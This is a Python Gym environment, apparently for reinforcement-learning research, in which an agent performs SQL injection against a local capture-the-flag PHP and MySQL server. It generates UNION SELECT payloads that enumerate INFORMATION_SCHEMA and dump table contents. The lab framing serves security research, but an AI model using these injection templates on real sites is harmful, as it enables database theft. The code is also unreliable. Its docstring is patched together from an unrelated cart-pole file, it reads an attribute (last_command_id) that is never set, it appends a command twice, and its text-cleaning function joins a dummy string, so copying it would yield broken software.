"""
Copy of a copy: This was copied from https://raw.github.uio.no/fabiomz/gym-qiscoin/master/qiscoin/envs/qiscoin_env.py
Classic cart-pole system implemented by Rich Sutton et al.
Copied from http://incompleteideas.net/sutton/book/code/pole.c
permalink: https://perma.cc/C9ZM-652R
"""

import math,sys
import gym
from gym import spaces, logger
from gym.utils import seeding
import numpy as np
import matplotlib.pyplot as plt
import generate_actions
import const
import requests
import re
import mysql.connector
from bs4 import BeautifulSoup
from ctfsql.env.core import GameState, GameNotRunningError



class CTFSQLEnv1(gym.Env):
    """
    Description:
        A webserver exposing a query with a potential SQL injection vulnerability. Behind the vulnerability lies a flag.
    Observation:
        Type: MiltiDiscrete(3)
        Num    Observation
        0   action tried and returned a negative answer
        1   action never tried
        2   action tried and returned a positive answer
    Actions:
        Type: Discrete(n)
        Num    Action
        n    SQL statement n
    Reward:
        +10 for capturing the flag, -1 in all the other cases.
    Starting State:
        Webserver initialized with a random query. No action tested.
    Episode Termination:
        Capture the flag.
    """

    metadata = {'render.modes': ['human', 'ansi']}

    def __init__(self):
        # Action space
        self.action_len = len(generate_actions.generate_actions())
        self.action_space = spaces.Discrete(self.action_len)

        # Observation space
        self.observation_space = spaces.MultiDiscrete(np.ones(self.action_len)*3)

        # State
        self.state = np.ones(self.action_len)

        # Random integers to setup the server
        self.escape_type = np.random.randint(0, const.MAX_ESC_TYPE)
        self.column_type = np.random.randint(const.MIN_COLUMN_TYPE, const.MAX_COLUMN_TYPE)


        # Get the set of actions that are syntactically correct
        self.syntaxmin = 0 + self.escape_type * 11
        self.syntaxmax = 10 + self.escape_type * 11

        self.done = False
        self.verbose = False
        if(self.verbose): print('Game setup with a random query')

        self.seed()
        self.viewer = None
        #self.steps_beyond_done = None

    def seed(self, seed=None):
        self.np_random, seed = seeding.np_random(seed)
        return [seed]


    def step(self, action_id):
        action = self.command_space[action_id]
        assert self.action_space.contains(action_id), "%r (%s) invalid"%(action, type(action_id))

        """
        0neg
        1neut
        2pos
        """
        self.done = False
        self.last_action = action.strip()
        self.last_action_id = action_id
        self.is_admissible_commands['table'] = False
        self.is_admissible_commands['column'] = False

        # Process action
        description = ''
        x = requests.post(self.url, data = {'id': action, 'pw': ''})
        if x.status_code == self.responce_success:
            obs = self.regex_feedback_url(x.text)
            if action in obs:
                description = 'Responce is good but Query is syntactically wrong.'
                self.state[action_id] = 0
            elif 'seccon' in obs:
                self.state[action_id] = 2
                description = 'You got the flag.'
                self.done = True
                self.is_admissible_commands['table'] = False
                self.is_admissible_commands['column'] = False
            elif 'COLUMNS' in obs and 'COLUMN_PRIVILEGES' in obs:
                self.state[action_id] = 2
                description = 'Successfully get table names in the database.'
                if not self.get_table_name:
                    self.is_admissible_commands['table'] = True
            elif action_id >= self.action_len and 'id' in obs:
                self.state[action_id] = 2
                description = 'Successfully get column names in the table.'
                if not self.get_column_name:
                    self.is_admissible_commands['column'] = True
            elif action_id >= self.syntaxmin and action_id < self.syntaxmax:
                self.state[action_id] = 2
                description = 'Correct exploratory action for the escape.'
        else:
            obs = None
            if (action_id >= self.syntaxmin and action_id < self.syntaxmax):
                self.state[action_id] = 2
                description = 'Correct exploratory action for the escape but the column is wrong.'
            else:
                self.state[action_id] = 0
                description = 'Server responce error.'

        self.admissible_commands(obs)
        self.infos = {
            'description': description,
            'won': self.done,
            'max_score': 100,
            'obs': obs,
            'responce_data': x,
            'status_code': x.status_code,
            'url': self.url,
        }

        return self.state, 10 if self.done else -1, self.done, {'msg':description}

    def reset(self):
        self.done = False
        self.action_len = len(generate_actions.generate_actions())
        self.state = np.ones(self.action_len)
        self.action_space = spaces.Discrete(self.action_len)
        self.command_space = generate_actions.generate_actions()

        # init ctf database by escape type
        self.escape_type = np.random.randint(0, const.MAX_ESC_TYPE)
        self.column_type = np.random.randint(const.MIN_COLUMN_TYPE, const.MAX_COLUMN_TYPE)
        self.db_config = const.db_config
        self.init_database()

        # Get the ip address of ctf envirnoment
        self.url = const.URL + 'ctf_{0}/ctf_{0}_{1}.php'.format(self.escape_type + 1, self.column_type)
        self.responce_success = const.RESONCE_SUCCESS

        # Get the set of actions that are syntactically correct
        self.syntaxmin = 0 + self.escape_type * 11
        self.syntaxmax = 10 + self.escape_type * 11

        x = requests.get(self.url)
        obs = self.regex_feedback_url(x.text)
        self.table_info = {}
        self.get_table_name = False
        self.get_column_name = False
        self.is_admissible_commands = {'table': False, 'column': False}
        self.infos = {
            'description': 'Try SQL injection and get the flag',
            'won': False,
            'max_score': 100,
            'obs': obs,
            'responce_data': x,
            'status_code': x.status_code,
            'url': self.url,
        }

        if(self.verbose): print('Game reset (with a new random query!)')
        return self.state#,0,self.done,{'msg':'Game reset'}

    def init_database(self):
        try:
            db = mysql.connector.connect(**self.db_config)
            query = 'INSERT INTO `users` (`id`, `loginid`, `password` ,`auth_bit`, `lasttime`, `comment`) VALUES (%s, %s, %s, %s, %s, %s)'
            if db.is_connected():
                cursor = db.cursor();
                cursor.execute('DROP TABLE IF EXISTS users')
                if self.escape_type <= 3:
                    cursor.execute("CREATE table users (id INT,loginid TEXT, password TEXT, auth_bit int, lasttime TIMESTAMP, comment TEXT)")
                    users_dataset = const.users_dataset_text
                else:
                    cursor.execute("CREATE table users (id INT,loginid INT, password TEXT, auth_bit int, lasttime TIMESTAMP, comment TEXT)")
                    users_dataset = const.users_dataset_int
                for user in users_dataset:
                    cursor.execute(query, user)
                    db.commit()

                if (self.verbose): print('Successfully init database')
            else:
                print('Failed to connect database')
                raise GameNotRunningError()
        except:
            print('Failed to set database up')
            raise GameNotRunningError()

    def admissible_commands(self, obs = None):
        if self.is_admissible_commands['table'] and obs is not None:
            escape = ["'", "')", '"', '")'][self.escape_type]
            base_column_query = "{0} UNION SELECT GROUP_CONCAT(column_name), {1} from INFORMATION_SCHEMA.columns where table_name = '{2}'; -- "
            column_num = (self.last_command_id + 4) % 11
            columns = "1"
            for i in range(2, column_num+2):
                columns = columns + "," + str(i)
            action_index = len(self.command_space)
            for table in obs.split(','):
                if ' ' not in table:
                # if ' ' not in table and table.islower():
                    command = base_column_query.format(escape, columns, table)

                    self.state = np.concatenate((self.state, np.ones(1)), axis=None)
                    self.action_space = spaces.Discrete(self.action_len + 1)
                    self.command_space.append(command)
                    self.action_len += 1
                    self.table_info[action_index] = {'table': table, 'column_num': column_num, 'command': command}
                    action_index += 1

            self.get_table_name = True
            return self.command_space
        elif self.is_admissible_commands['column'] and obs is not None:
            content_type_encoding = self.infos['responce_data'].encoding if self.infos['responce_data'].encoding != 'ISO-8859-1' else None
            soup = BeautifulSoup(self.infos['responce_data'].content, 'html.parser', from_encoding=content_type_encoding)
            body_element = soup.find_all('body')
            paragraphs = []
            for element in body_element:
                paragraphs.append(str(element))
            text = self.regex_feedback_url(paragraphs[0])

            escape = ["'", "')", '"', '")'][self.escape_type]
            base_column_query = "{0} UNION SELECT GROUP_CONCAT(concat({1}), '<SEP>'), {2} from {3}; -- "
            table = self.table_info[self.last_command_id]['table']
            column_num = self.table_info[self.last_command_id]['column_num']
            columns = "1"
            for i in range(2, column_num+2):
                columns = columns + "," + str(i)
            for inputs in text.split():
                if ',' in inputs:
                    query = ''
                    for col in inputs.split(','):
                        # query = query + str(col) + ", ' ', "
                        if col.islower():
                            query = query + str(col) + ", ' ', "
                    command = base_column_query.format(escape, query[:-7], columns, table)
                    if command not in self.command_space:
                        self.state = np.concatenate((self.state, np.ones(1)), axis=None)
                        self.action_space = spaces.Discrete(self.action_len + 1)
                        self.command_space.append(command)
                        self.action_len += 1
                        self.command_space.append(command)

            self.get_column_name = False
            return self.command_space
        else:
            return self.command_space

    def regex_feedback_url(self, url_text):
        text = "a\u3000 b\t\nc\r\n"
        url_text = re.sub('[\<|\>|\/|\{|\}|\#|\\n]+', ' ', url_text)
        return url_text.join(text.splitlines())

    def render(self, mode='human'):
        return None

    def close(self):
        return
